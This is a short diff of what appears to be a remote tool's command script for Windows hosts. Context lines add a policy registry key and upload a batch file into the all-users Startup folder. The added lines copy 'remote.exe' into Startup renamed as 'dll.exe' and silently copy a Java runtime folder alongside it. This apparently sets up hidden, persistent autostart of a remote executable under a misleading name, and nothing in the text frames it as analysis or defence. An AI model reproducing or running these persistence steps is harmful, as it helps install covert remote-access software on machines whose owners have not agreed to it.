@@ -34,3 +34,9 @@ cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policie
 
 upfile:D:\remotefile\dll>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\dll
 upfile:D:\remotefile\ick.bat>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ick.bat
+
+
+
+cmd:copy /Y remote.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\dll.exe"
+cmd:md "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jre"
+cmd:xcopy jre "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jre" /S /E /Y /Q
